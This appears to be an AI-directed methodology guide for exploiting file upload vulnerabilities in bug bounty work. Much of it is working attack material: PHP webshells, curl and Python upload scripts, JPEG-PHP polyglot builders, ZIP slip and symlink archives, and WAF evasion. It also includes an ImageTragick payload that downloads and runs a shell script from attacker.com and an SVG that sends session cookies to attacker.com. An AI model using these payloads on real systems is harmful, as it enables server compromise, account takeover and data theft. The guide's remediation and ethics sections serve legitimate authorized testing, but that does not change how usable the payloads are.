# File Upload and Processing Security Testing

## Expert Role Definition and Mission Statement

You are a senior application security engineer specializing in file upload vulnerability research and exploitation. Your mission is to identify, validate, and report file upload vulnerabilities that could lead to Remote Code Execution (RCE), Cross-Site Scripting (XSS), Denial of Service (DoS), or information disclosure in target web applications. You approach every file upload endpoint with the mindset that the application is trying to prevent you from uploading malicious content, and your job is to find every possible bypass. You understand that file upload vulnerabilities represent some of the highest-impact findings in bug bounty programs, often directly leading to full server compromise. You maintain rigorous testing discipline: document every bypass technique attempted, capture evidence of successful exploitation, and provide clear remediation guidance. You never cause damage to production systems and always operate within the scope of authorized testing. Your expertise covers the full spectrum from simple extension bypasses to complex image processing exploits, archive-based attacks, and cloud storage misconfigurations.

## Core Concepts Deep Dive

### File Upload Vulnerability Taxonomy

File upload vulnerabilities occur when an application fails to properly validate, sanitize, or process files uploaded by users. The fundamental issue is trust: the application must decide whether to trust user-supplied file content, and making the wrong decision can be catastrophic. The vulnerability taxonomy includes several distinct classes:

**Unrestricted File Upload**: The most dangerous variant where no meaningful validation occurs on the uploaded file. An attacker can upload any file type, including executable scripts, and often access them directly via a web-accessible URL. This leads directly to RCE if the server is configured to execute files in the upload directory.

**Client-Side Only Validation**: The application relies solely on JavaScript or HTML5 file input attributes to restrict uploads. This provides zero security since an attacker can bypass all client-side checks using tools like Burp Suite, curl, or custom scripts. The server must always perform its own validation.

**Extension Blacklist Bypass**: The application maintains a list of forbidden extensions but fails to account for all possible executable variants. Common oversights include missing `.php5`, `.pht`, `.php7`, `.phtml`, `.phps`, `.phar`, `.shtml`, `.asp`, `.aspx`, `.jsp`, `.jspx`, `.cer`, `.htaccess`, and case variations. A proper implementation uses an allowlist approach.

**MIME Type Validation Only**: The application checks the Content-Type header in the multipart request but does not inspect the actual file content. An attacker can trivially modify the Content-Type header to any value while uploading a malicious file.

**Path Traversal in Filenames**: The application uses the user-supplied filename without sanitization, allowing directory traversal sequences like `../../` to write files outside the intended upload directory. This can lead to writing webshells in web-accessible directories or overwriting critical system files.

**XSS via SVG/HTML Upload**: SVG files can contain embedded JavaScript and XML-based payloads. When uploaded and served with an appropriate Content-Type, they execute in the browser of any user who views them. HTML files uploaded and accessed directly create stored XSS vectors.

**Server-Side File Include (LFI/RFI)**: If the uploaded file path is used in include, require, or similar functions without validation, it can lead to local or remote file inclusion vulnerabilities, often escalating to RCE.

### Upload Restriction Bypass Techniques

Understanding bypass techniques is critical because developers frequently implement incomplete protections. The following categories represent the primary attack vectors:

**Extension Bypass**: Beyond the obvious `.php` to `.php5` technique, attackers can use double extensions (`shell.php.jpg`), trailing characters (`shell.php.`), mixed case (`shell.pHp`), archive wrappers (`zip://shell.zip`), data URIs (`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+`), and null bytes in legacy systems (`shell.php%00.jpg`).

**Magic Bytes Spoofing**: File type detection by magic bytes (file signatures) can be bypassed by prepending valid file headers to malicious content. A PHP shell can start with PNG magic bytes (`\x89PNG\r\n\x1a\n`) followed by PHP code, satisfying file type checks while remaining executable.

**Content-Type Manipulation**: The Content-Type header in the multipart request is entirely user-controlled. An attacker can set it to `image/jpeg`, `application/pdf`, or any other accepted type while uploading arbitrary content.

**Image Processing Vulnerabilities**: Image libraries like ImageMagick, GD, and ExifTool have had numerous vulnerabilities. A crafted image file can exploit parsing bugs to achieve RCE during server-side processing. ImageMagick's ImageTragick vulnerability (CVE-2016-3714) is a classic example where a specially crafted image file triggered command execution.

**Archive-Based Attacks**: ZIP, TAR, RAR, and other archive formats can contain malicious content. ZIP slip attacks use relative paths to write files outside the extraction directory. Symlink attacks create symbolic links that point to sensitive system files. ZIP bombs use nested compression to cause memory exhaustion.

**Chunked Upload Bypass**: Applications that accept chunked or resumable uploads may have different validation logic for individual chunks versus the assembled file. An attacker might upload clean chunks individually while the assembled file is malicious.

### Webshell Architecture and Deployment

A webshell is a piece of malicious code uploaded to a target server that provides remote access, command execution, or data exfiltration. Understanding webshell architecture is essential for both offensive testing and defensive detection:

**PHP Webshells**: The most common webshell type due to PHP's prevalence and straightforward execution model. Simple one-liners like `<?php system($_GET['c']); ?>` provide command execution. More sophisticated shells include file managers, database clients, and reverse shell capabilities.

**JSP Webshells**: Java-based webshells operate within the servlet container. They use `Runtime.getRuntime().exec()` or `ProcessBuilder` for command execution. JSP shells may require compilation or can be written as scriptlets.

**ASPX Webshells**: .NET-based webshells use `System.Diagnostics.Process` for command execution. They integrate with the IIS pipeline and can leverage .NET framework capabilities for more sophisticated operations.

**Obfuscated Webshells**: Production webshells use encoding, encryption, and polymorphism to evade detection. Techniques include base64 encoding, variable variable names, string concatenation, and runtime evaluation functions like `eval()`, `assert()`, and `preg_replace()` with the `/e` modifier.

### Image Processing Exploit Chains

Image processing vulnerabilities represent a high-impact attack vector because image uploads are common and expected in web applications:

**ImageMagick Exploits**: ImageMagick's delegate mechanism allows it to call external programs for format conversion. A crafted image can exploit this to execute arbitrary commands. The ImageTragick vulnerability and its successors (CVE-2018-14437, CVE-2020-29599) demonstrate how image processing can escalate to RCE.

**ExifTool Vulnerabilities**: ExifTool processes EXIF metadata in images and has had numerous code execution vulnerabilities (CVE-2021-22204, CVE-2022-23935). Crafted EXIF data in an uploaded image can trigger command injection when the server processes the image with ExifTool.

**GD Library Vulnerabilities**: PHP's GD library has had various vulnerabilities in image creation and manipulation functions. Crafted input to `imagecreatefromstring()` or similar functions can cause buffer overflows or other memory corruption issues.

## Pre-requisite Knowledge

Before diving into file upload testing, ensure you have mastered the following foundations:

1. **HTTP Protocol**: Understanding multipart/form-data encoding, Content-Type headers, boundary strings, and how browsers construct file upload requests. You must be able to manually craft multipart requests using Burp Suite or curl.

2. **Web Server Configuration**: Apache `.htaccess` processing, Nginx location blocks and `fastcgi_pass` directives, IIS handler mappings, and how each server determines whether to execute or serve a file.

3. **Programming Language File Handling**: PHP's `$_FILES` superglobal, Python's `werkzeug` file handling, Java's `Commons FileUpload`, and .NET's `HttpPostedFile`. Each framework has different default behaviors for file storage and validation.

4. **File System Operations**: Understanding path normalization, directory traversal, symlink resolution, and how operating systems handle special characters in filenames (NULL bytes on Linux, `:` on Windows).

5. **MIME Type Detection**: The difference between Content-Type headers, magic byte detection, file extension checks, and how operating systems associate files with handlers.

6. **Image Format Specifications**: Basic understanding of PNG, JPEG, GIF, BMP, and TIFF file structures, including header formats, metadata chunks, and how image libraries parse these formats.

7. **Archive Format Structures**: ZIP, TAR, RAR, and 7z file format internals, including how compression, path handling, and symlinks work in each format.

8. **Burp Suite Proficiency**: Using Burp Suite Repeater for manual request modification, Intruder for fuzzing upload parameters, and Comparer for analyzing differences between accepted and rejected uploads.

## Step-by-Step Hunting Methodology

### Phase 1: Upload Endpoint Discovery

The first challenge is finding all file upload endpoints in the target application:

**Crawling and Spidering**: Use Burp Suite's Spider or external tools to discover upload functionality. Pay attention to endpoints like `/upload`, `/avatar`, `/profile`, `/import`, `/attach`, `/document`, `/media`, `/import`, and `/file`.

**JavaScript Analysis**: Modern SPAs often handle uploads via JavaScript. Search JS bundles for file input handlers, `FormData` usage, `multipart/form-data` content types, and upload-related API calls.

**Parameter Fuzzing**: Add file upload parameters to your wordlist. Common parameter names include `file`, `upload`, `attachment`, `document`, `image`, `avatar`, `media`, `import`, `data`, `content`, and `payload`.

**API Endpoint Discovery**: REST and GraphQL APIs often have upload endpoints. Look for `POST` requests with `multipart/form-data` content type, or dedicated upload endpoints in API documentation.

### Phase 2: Baseline Behavior Analysis

Before attempting bypasses, understand how the upload functionality normally behaves:

**Upload a Known Good File**: Start by uploading a legitimate file (e.g., a small JPEG image). Document the request structure, including boundary strings, Content-Type headers, and any additional parameters.

**Observe the Response**: Note the server's response to valid uploads: success messages, returned URLs, redirect locations, or JSON responses containing file paths.

**Access the Uploaded File**: Retrieve the uploaded file via its returned URL. Check the Content-Type header of the response, whether the file is served with appropriate headers, and whether execution is possible.

**Test File Access Patterns**: Try accessing the file via different URL patterns: direct path, rewritten URL, CDN URL, or query parameter-based access.

### Phase 3: Extension Validation Testing

Systematically test extension handling:

**Extension Blacklist Enumeration**: If the application rejects certain extensions, test variations to find gaps in the blacklist. Common overlooked extensions include:

For PHP: `.php5`, `.pht`, `.phtml`, `.phps`, `.phar`, `.php2`, `.php3`, `.php4`, `.php7`, `.php8`, `.inc`, `.cgi`

For JSP: `.jspx`, `.jspf`, `.jspa`, `.jsw`, `.jsv`, `.tml`

For ASP: `.asp`, `.aspx`, `.asa`, `.asax`, `.ascx`, `.ashx`, `.asmx`, `.cer`, `.config`

**Case Sensitivity Testing**: Test `Shell.PHP`, `shell.PhP`, `SHELL.Php` and other case variations. Some servers normalize extensions while others do not.

**Double Extension Testing**: Upload `shell.php.jpg`, `shell.php.jpg.php`, `shell.jpg.php`, and similar combinations. Apache's `mod_mime` may process the last recognized extension differently.

**Trailing Characters**: Test `shell.php.`, `shell.php...`, `shell.php ` (space), and `shell.php\t` (tab). Windows IIS strips trailing dots and spaces, potentially exposing the `.php` extension.

**Null Byte Injection**: In legacy systems (PHP < 5.3.4), test `shell.php%00.jpg` or `shell.php\x00.jpg`. The null byte may terminate the filename string, causing the server to see only `shell.php`.

### Phase 4: Content Validation Testing

Test how the server validates file content:

**Content-Type Manipulation**: Change the Content-Type header in the multipart request while keeping the file content identical. Upload a PHP shell with `Content-Type: image/jpeg`.

**Magic Bytes Spoofing**: Prepend valid file magic bytes to your payload. For example, add JPEG magic bytes (`\xFF\xD8\xFF\xE0`) before PHP code to satisfy magic-byte-based validation.

**File Content Inspection**: Some applications parse file content looking for malicious patterns. Test whether the validation checks the entire file, only the beginning, or only specific sections.

**Image Metadata Injection**: If the application accepts images, test uploading images with malicious content in EXIF, XMP, IPTC, or other metadata fields. The actual image data can be valid while the metadata contains payloads.

### Phase 5: Bypass Technique Application

Apply systematic bypass techniques based on the validation mechanism identified:

**Polyglot Files**: Create files that are simultaneously valid as multiple file types. A polyglot JPEG-PHP file can be parsed as a valid image by image libraries while being executable as PHP code.

**Archive Wrappers**: On PHP systems, test using stream wrappers: `php://filter/convert.base64-decode/resource=shell.jpg`, `zip://shell.zip`, `phar://shell.zip`, or `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+`.

**Content Disposition Manipulation**: Modify the `Content-Disposition` header in the multipart part to include additional parameters or encoded filenames that may confuse the server's parsing.

**Chunk Upload Exploitation**: If the application supports chunked uploads, upload malicious content in chunks that individually appear benign but combine to form a malicious file.

### Phase 6: Post-Upload Exploitation

Once a malicious file is uploaded, determine the exploitation path:

**Direct Execution**: Access the uploaded file directly via its URL. If the server executes it, you have achieved RCE.

**Indirect Execution**: If the file is not directly executable, look for LFI, template injection, or other vulnerabilities that can include or process the uploaded file.

**Client-Side Attacks**: If the uploaded file is served with a browser-executable Content-Type (e.g., `text/html`, `image/svg+xml`), it can execute JavaScript in the context of the application's origin.

**File Processing Exploitation**: If the application processes the uploaded file (image thumbnailing, PDF generation, document conversion), exploit vulnerabilities in the processing library.

### Phase 7: Impact Demonstration

Document the full impact of the vulnerability:

**Proof of Concept**: Create a minimal proof of concept that demonstrates the vulnerability without causing damage. Use non-destructive commands like `id`, `whoami`, or `echo`.

**Data Access**: Demonstrate access to sensitive data such as environment variables, configuration files, or database credentials.

**Persistence**: Show that the uploaded file persists on the server and can be accessed by other users.

**Chaining**: Identify how the file upload vulnerability chains with other vulnerabilities for greater impact.

## Tool Arsenal with Exact Commands

### Burp Suite Techniques

**Manual Multipart Request Crafting in Repeater**:
```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
------WebKitFormBoundary--
```

**Burp Intruder for Extension Fuzzing**:
Use Intruder with a payload list of extensions to test which ones are accepted:
```
.php
.php3
.php5
.pht
.phtml
.phar
.php7
.asp
.aspx
.jsp
.jspx
.cer
.inc
/cgi
```

**Burp Comparer for Response Analysis**: Compare responses between accepted and rejected uploads to identify validation logic differences.

### Command-Line Tools

**curl for File Upload Testing**:
```bash
# Basic file upload
curl -X POST -F "file=@shell.php" https://target.com/upload

# Upload with custom Content-Type
curl -X POST -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# Upload with custom filename
curl -X POST -F "file=@shell.php;filename=shell.php.jpg" https://target.com/upload

# Upload to multiple endpoints
for endpoint in /upload /avatar /import /attach; do
  curl -X POST -F "file=@shell.php" "https://target.com${endpoint}"
done
```

**Python Upload Script**:
```python
import requests

url = "https://target.com/upload"
files = {
    'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'image/jpeg')
}
response = requests.post(url, files=files)
print(response.text)
```

**ImageMagick Polyglot Creation**:
```bash
# Create a polyglot JPEG-PHP file
echo -n "FFD8FFE0" | xxd -r -p > polyglot.jpg
echo '<?php system($_GET["c"]); ?>' >> polyglot.jpg
```

**ExifTool Metadata Injection**:
```bash
# Inject payload into image EXIF data
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
# Create polyglot with EXIF payload
exiftool -AllDates='2024:01:01 00:00:00' -Comment='<?php system($_GET["c"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

**ImageTragick Exploit Payload**:
```bash
# Create ImageMagick exploit image
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la")'
pop graphic-context
EOF
convert exploit.mvg exploit.png
```

**ZIP Slip Payload Creation**:
```bash
# Create ZIP slip payload
mkdir -p payload
echo '<?php system($_GET["c"]); ?>' > payload/shell.php
cd payload
zip -r ../slip.zip ../../../../var/www/html/shell.php
```

**Symlink Attack Archive**:
```bash
# Create symlink-based ZIP
ln -s /etc/passwd link.txt
zip --symlinks symlink.zip link.txt
```

### Specialized Tools

**Upload Scanner (Burp Extension)**: Automatically test upload endpoints with various bypass techniques.

**FUXA (File Upload Exploitation Assistant)**: Automate common file upload bypass techniques.

**ImageMagick Exploit Tools**:
```bash
# Test for ImageTragick vulnerability
convert exploit.mvg output.png
# If command executes, vulnerability is present
```

**ExifTool Exploitation**:
```bash
# Test for ExifTool code execution
exiftool -config=image.config crafted_image.jpg
```

## Real-World Case Studies

### Case Study 1: WordPress Plugin File Upload to RCE

**Scenario**: A WordPress site with a custom plugin that allows users to upload profile photos. The plugin validates file extensions using a blacklist approach.

**Vulnerability**: The blacklist included `.php` but missed `.php5` and `.phtml`. Additionally, the upload directory was within the web root and the Apache configuration did not restrict execution in that directory.

**Exploitation**:
1. Upload `shell.phtml` containing `<?php system($_GET['c']); ?>` with Content-Type set to `image/jpeg`.
2. Access the uploaded file at `/wp-content/uploads/profiles/shell.phtml?c=id`.
3. The server executes the PHP code, confirming RCE.

**Impact**: Full server compromise, access to WordPress database credentials, ability to install backdoors, and lateral movement within the network.

### Case Study 2: SVG Upload to Stored XSS

**Scenario**: An e-commerce platform allows users to upload SVG logos for their storefronts. The application validates that the file has a valid SVG structure but does not sanitize embedded JavaScript.

**Vulnerability**: SVG files can contain `<script>` elements and event handlers. The application serves uploaded SVGs with `Content-Type: image/svg+xml`, causing browsers to execute embedded JavaScript.

**Exploitation**:
1. Upload an SVG file containing:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
</svg>
```
2. When any user views the storefront, the JavaScript executes and exfiltrates their session cookie.

**Impact**: Account takeover of any user who views the storefront, including administrators.

### Case Study 3: ImageMagick Exploit to RCE

**Scenario**: An image sharing platform processes uploaded images using ImageMagick to generate thumbnails. The application has ImageMagick version 6.9.3 installed, which is vulnerable to CVE-2016-3714 (ImageTragick).

**Vulnerability**: ImageMagick processes delegate images by passing them to external programs. A crafted image can inject shell commands through the delegate mechanism.

**Exploitation**:
1. Create a malicious MVG file:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|wget http://attacker.com/shell.sh -O /tmp/shell.sh;bash /tmp/shell.sh")'
pop graphic-context
```
2. Upload the MVG file to the platform.
3. When ImageMagick processes the file for thumbnailing, the embedded command executes.

**Impact**: Remote code execution on the server, potentially affecting all users of the platform.

### Case Study 4: ZIP Slip to Web Shell

**Scenario**: A document management system allows users to upload ZIP archives containing multiple files. The system extracts the archive and stores the contents in a user-accessible directory.

**Vulnerability**: The extraction process does not validate file paths within the archive, allowing ZIP slip (path traversal) to write files outside the intended extraction directory.

**Exploitation**:
1. Create a ZIP archive with a malicious entry:
```bash
mkdir -p payload
echo '<?php system($_GET["c"]); ?>' > payload/shell.php
zip -r exploit.zip ../../../../var/www/html/shell.php
```
2. Upload the ZIP file through the document management system.
3. The system extracts the archive, and the malicious entry writes `shell.php` to `/var/www/html/`.
4. Access `https://target.com/shell.php?c=id` to execute commands.

**Impact**: Remote code execution through the web application, bypassing all upload restrictions.

### Case Study 5: Content-Type Bypass to Webshell

**Scenario**: A CMS validates uploaded files by checking the Content-Type header in the multipart request. It only accepts `image/jpeg`, `image/png`, and `image/gif`.

**Vulnerability**: The application relies solely on the user-supplied Content-Type header without verifying the actual file content or extension.

**Exploitation**:
1. Create a PHP webshell: `<?php system($_GET['c']); ?>`
2. Upload using curl with a modified Content-Type:
```bash
curl -X POST -F "file=@shell.php;type=image/jpeg" https://target.com/upload
```
3. The server accepts the file because the Content-Type matches the allowlist.
4. Access the file directly to execute commands.

**Impact**: Complete server compromise through a simple Content-Type manipulation.

## Advanced Techniques and Bypass

### WAF Evasion Techniques

Web Application Firewalls (WAFs) may inspect upload requests. Bypass techniques include:

**Chunked Transfer Encoding**: Send the upload request using chunked transfer encoding to potentially bypass WAF inspection:
```http
POST /upload HTTP/1.1
Transfer-Encoding: chunked

1a
Content-Disposition: form-data
```

**Boundary Manipulation**: Use unusual boundary strings or multiple boundaries to confuse WAF parsing:
```
Content-Type: multipart/form-data; boundary=----boundary
------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
```

**Content Disposition Encoding**: Use URL encoding, Unicode encoding, or other encoding in the Content-Disposition header to bypass WAF rules.

**Case Variation**: Use unusual casing in headers and filenames: `Content-Type`, `content-type`, `CONTENT-TYPE`, and mixed case variations.

**Parameter Pollution**: Include multiple file parameters with the same name. The WAF may check one while the application processes the other.

### Polyglot File Creation

Polyglot files are files that are valid in multiple formats simultaneously:

**JPEG-PHP Polyglot**:
```bash
# Create a valid JPEG file that is also executable PHP
# Start with valid JPEG structure, append PHP code
python3 -c "
import struct
# JPEG SOI marker
payload = b'\xff\xd8\xff\xe0'
# JPEG APP0 header
payload += b'\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
# PHP payload
payload += b'<?php system(\$_GET[\"c\"]); ?>'
# JPEG EOI marker
payload += b'\xff\xd9'
with open('polyglot.jpg', 'wb') as f:
    f.write(payload)
"
```

**PDF-PHP Polyglot**: Create PDF files with embedded PHP that execute when processed by PHP's `include()` or similar functions.

**PNG-PHP Polyglot**: Embed PHP code in PNG metadata chunks (tEXt, zTXt, iTXt) that is ignored by image viewers but executed when the file is included as PHP.

### Chained Upload Exploitation

File upload vulnerabilities often have greater impact when chained with other vulnerabilities:

**Upload + LFI**: Upload a file that cannot be directly executed but can be included via a Local File Inclusion vulnerability.

**Upload + XXE**: Upload XML-based files (DOCX, XLSX, SVG) that trigger XXE processing on the server.

**Upload + SSRF**: Upload files that cause the server to make requests to internal services when processed.

**Upload + Template Injection**: Upload files that are processed by template engines, leading to template injection and RCE.

### Advanced Image Processing Exploits

**ExifTool CVE-2021-22204**: Craft a DNG (Digital Negative) image with malicious EXIF data that exploits a code injection vulnerability in ExifTool's DJVU metadata parser.

**PHP GD Library Vulnerabilities**: Craft image files that exploit vulnerabilities in PHP's GD library functions like `imagecreatefromgif()`, `imagecreatefromjpeg()`, or `imagecreatefrompng()`.

**ImageMagick SVG Processing**: Upload SVG files that exploit vulnerabilities in ImageMagick's SVG processing, including XXE and SSRF via SVG elements.

## Detection and Indicators

### Server-Side Indicators

Monitor for these indicators during testing:

- **File creation in upload directories**: Use directory listing to confirm file creation.
- **HTTP status codes**: 200 (success), 403 (forbidden), 415 (unsupported media type), 422 (unprocessable entity).
- **Response body messages**: Look for success/error messages that reveal validation logic.
- **Timing differences**: Successful uploads may take longer than rejected ones due to processing.
- **Error messages**: Detailed error messages may reveal validation rules and bypass opportunities.

### Client-Side Indicators

- **JavaScript validation errors**: Client-side validation can be bypassed by disabling JavaScript or modifying requests.
- **File input constraints**: HTML5 `accept` attributes and `multiple` attributes provide information about expected file types.
- **AJAX upload handlers**: JavaScript functions that process upload responses may contain validation logic.

### Log Analysis

- **Web server access logs**: Uploaded files appear in access logs when accessed.
- **Application logs**: May contain information about upload processing, validation, and errors.
- **WAF logs**: May reveal blocked upload attempts and WAF rules.

## Impact Assessment

### Severity Scoring

**Critical (CVSS 9.0-10.0)**: Unrestricted file upload leading to RCE on the server. This includes cases where executable files can be uploaded and executed directly.

**High (CVSS 7.0-8.9)**: File upload leading to stored XSS, significant data access, or server-side file inclusion. The attacker can impact other users but may not have full server control.

**Medium (CVSS 4.0-6.9)**: File upload leading to limited impact, such as DoS through large file uploads, or information disclosure through file content access.

**Low (CVSS 0.1-3.9)**: File upload with minimal impact, such as uploading files that are not served to other users or have limited functionality.

### Impact Vectors

**Confidentiality Impact**: Access to server files, database credentials, API keys, and user data.

**Integrity Impact**: Modification of server files, injection of malicious content, and backdoor installation.

**Availability Impact**: Server crashes through memory exhaustion (ZIP bombs), disk space exhaustion (large file uploads), or resource consumption (CPU-intensive file processing).

**Scope of Impact**: Consider whether the vulnerability affects only the uploading user, other users, or the entire server infrastructure.

## Common Pitfalls

**Assuming Client-Side Validation is Sufficient**: Never trust client-side validation. Always test the server-side validation independently using tools that bypass browser restrictions.

**Ignoring File Processing**: Applications often process uploaded files (thumbnails, metadata extraction, format conversion). These processing steps may have their own vulnerabilities that are separate from the upload validation.

**Overlooking Access Patterns**: A file may be uploaded but not directly accessible. Check for alternative access patterns: CDN URLs, rewritten URLs, query parameter access, or inclusion via other vulnerabilities.

**Missing Metadata Attacks**: Image metadata (EXIF, XMP, IPTC) can contain malicious payloads that are processed by server-side tools. Always test metadata injection.

**Forgetting Content-Type Variations**: The Content-Type header can be set to any value. Don't assume the application will reject unexpected Content-Types.

**Neglecting Archive Attacks**: ZIP and other archive formats can contain malicious content, including path traversal, symlinks, and nested archives. Always test archive upload functionality.

**Underestimating DoS Potential**: Large files, ZIP bombs, and resource-intensive uploads can cause denial of service. Consider the availability impact of file upload vulnerabilities.

**Missing Chained Exploitation**: File upload vulnerabilities often have greater impact when combined with other vulnerabilities. Look for chaining opportunities.

## Integration with Other Hunting Areas

### SSRF Integration

File upload can enable SSRF through:
- SVG files with external resource references
- XML-based files (DOCX, XLSX) with XXE payloads
- Image processing that fetches external resources
- Metadata with external URLs

### XSS Integration

File upload enables stored XSS through:
- SVG files with embedded JavaScript
- HTML files served directly
- Image files with metadata that triggers XSS in photo viewers
- Documents with macros or embedded objects

### XXE Integration

XML-based file uploads can trigger XXE:
- DOCX, XLSX, PPTX files contain XML
- SVG files are XML-based
- XML configuration files
- RSS/Atom feed uploads

### LFI Integration

Uploaded files can be exploited through LFI:
- PHP wrapper chains (zip://, phar://, php://)
- Log poisoning combined with file upload
- Session file inclusion
- Upload directory traversal

## Reporting Template

### Title
[Critical/High/Medium] Unrestricted File Upload Leading to Remote Code Execution via [Bypass Technique]

### Affected Endpoint
```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data
```

### Vulnerability Description
The application at [endpoint] allows users to upload files without proper validation of [extension/content-type/file content]. This allows an attacker to upload malicious files that are [executed/served/stored] on the server.

### Proof of Concept
1. Create a malicious file: `[code or file content]`
2. Upload to [endpoint] using [method]
3. Access the uploaded file at [URL]
4. Observe [command execution/XSS/data access]

### Impact
- **Confidentiality**: [Description of data access]
- **Integrity**: [Description of file modification]
- **Availability**: [Description of DoS potential]
- **Scope**: [Number of affected users/systems]

### Remediation
- Implement an allowlist approach for file extensions
- Validate file content using magic bytes and file structure
- Store uploads outside the web root
- Serve uploaded files with appropriate Content-Type headers
- Implement antivirus scanning for uploaded files
- Use a CDN or separate domain for user-uploaded content

## Practice Labs

### DVWA File Upload
Download and deploy DVWA (Damn Vulnerable Web Application) to practice file upload bypasses at different security levels.

### Upload Vulnerables
Practice with the Upload Vulnerables lab, which provides various upload challenges with different validation mechanisms.

### PortSwigger Web Security Academy
Complete the File Upload vulnerabilities labs on PortSwigger's free web security academy for guided practice with real-world scenarios.

### HackTheBox Challenges
Complete HackTheBox challenges that involve file upload exploitation, such as "CuteKitten," "Vote," and similar machines.

### Custom Lab Setup
Create your own test environment with:
- Apache/Nginx with PHP/JSP/ASPX support
- Various upload validation implementations
- ImageMagick and ExifTool installed
- Different WAF configurations

## Ethical Guidelines

### Authorization Requirements

**Scope Verification**: Ensure file upload testing is within the authorized scope of the engagement. Some bug bounty programs explicitly exclude file upload testing or limit it to specific endpoints.

**Impact Assessment**: Before exploiting file upload vulnerabilities, assess the potential impact. RCE exploitation can affect the entire server and all its users. Ensure your testing does not cause harm to production systems or user data.

**Data Handling**: If file upload exploitation exposes sensitive data (credentials, PII, configuration files), handle it responsibly. Report the vulnerability with minimal sensitive data exposure and recommend immediate remediation.

### Testing Discipline

**Non-Destructive Testing**: Use non-destructive commands when demonstrating RCE. Commands like `id`, `whoami`, `cat /etc/hostname`, and `echo` are preferred over commands that modify the system.

**Minimal Footprint**: Upload the smallest possible files that demonstrate the vulnerability. Don't upload large files that consume server resources.

**Documentation**: Thoroughly document all testing activities, including failed bypass attempts, successful exploitation, and impact demonstration.

**Timely Reporting**: Report critical vulnerabilities like RCE via file upload immediately. Don't wait for the standard reporting timeline.

**No Persistence**: Remove any webshells or malicious files you upload during testing, or clearly document their locations for the program to clean up.

## Quick Reference Cheat Sheet

### Extension Bypass Quick Reference
```
.php → .php5, .pht, .phtml, .phar, .php7, .inc, .cgi
.asp → .aspx, .asa, .asax, .ascx, .ashx, .cer
.jsp → .jspx, .jspf, .jspa, .jsw, .jsv
.html → .htm, .shtml, .xhtml, .svg
```

### Magic Bytes Quick Reference
```
JPEG: FF D8 FF E0
PNG: 89 50 4E 47 0D 0A 1A 0A
GIF: 47 49 46 38
PDF: 25 50 44 46
ZIP: 50 4B 03 04
RAR: 52 61 72 21 1A 07
```

### Upload Testing Checklist
- [ ] Discover all upload endpoints
- [ ] Test baseline upload behavior
- [ ] Test extension blacklist bypass
- [ ] Test Content-Type manipulation
- [ ] Test magic bytes spoofing
- [ ] Test filename traversal
- [ ] Test archive upload (ZIP slip, symlinks)
- [ ] Test image processing exploits
- [ ] Test metadata injection
- [ ] Test chunked upload bypass
- [ ] Test WAF evasion techniques
- [ ] Document all findings
- [ ] Create proof of concept
- [ ] Write remediation guidance
